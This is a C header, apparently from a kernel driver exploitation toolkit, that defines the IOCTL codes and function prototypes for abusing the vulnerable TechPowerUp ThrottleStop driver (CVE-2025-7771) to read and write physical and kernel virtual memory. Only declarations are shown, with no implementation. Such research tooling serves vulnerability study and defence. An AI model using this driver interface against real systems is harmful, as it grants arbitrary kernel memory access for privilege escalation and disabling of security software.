/* TechPowerUp ThrottleStop driver interface header. */

#pragma once

//
// TechPowerUp ThrottleStop driver interface.
// CVE-2025-7771
//

#define TPUP_DEVICE_TYPE (DWORD)0x8000

#define IOCTL_TPUP_READ_PHYSICAL_MEMORY                 \
    CTL_CODE(TPUP_DEVICE_TYPE, 0x1926, METHOD_BUFFERED, \
             FILE_ANY_ACCESS)  // 0x80006498

#define IOCTL_TPUP_WRITE_PHYSICAL_MEMORY                \
    CTL_CODE(TPUP_DEVICE_TYPE, 0x1927, METHOD_BUFFERED, \
             FILE_ANY_ACCESS)  // 0x8000649C

#define TPUP_MAX_CHUNK_SIZE 8

BOOL WINAPI TpupReadPhysicalMemory(_In_ HANDLE DeviceHandle,
                                   _In_ ULONG_PTR PhysicalAddress,
                                   _In_ PVOID Buffer,
                                   _In_ ULONG NumberOfBytes);

BOOL WINAPI TpupWritePhysicalMemory(_In_ HANDLE DeviceHandle,
                                    _In_ ULONG_PTR PhysicalAddress,
                                    _In_ PVOID Buffer,
                                    _In_ ULONG NumberOfBytes);

BOOL WINAPI TpupReadKernelVirtualMemory(_In_ HANDLE DeviceHandle,
                                        _In_ ULONG_PTR Address,
                                        _In_ PVOID Buffer,
                                        _In_ ULONG NumberOfBytes);

BOOL WINAPI TpupWriteKernelVirtualMemory(_In_ HANDLE DeviceHandle,
                                         _In_ ULONG_PTR Address,
                                         _In_reads_bytes_(NumberOfBytes)
                                             PVOID Buffer,
                                         _In_ ULONG NumberOfBytes);

BOOL WINAPI TpupValidatePrerequisites(_In_ PKDU_CONTEXT Context);
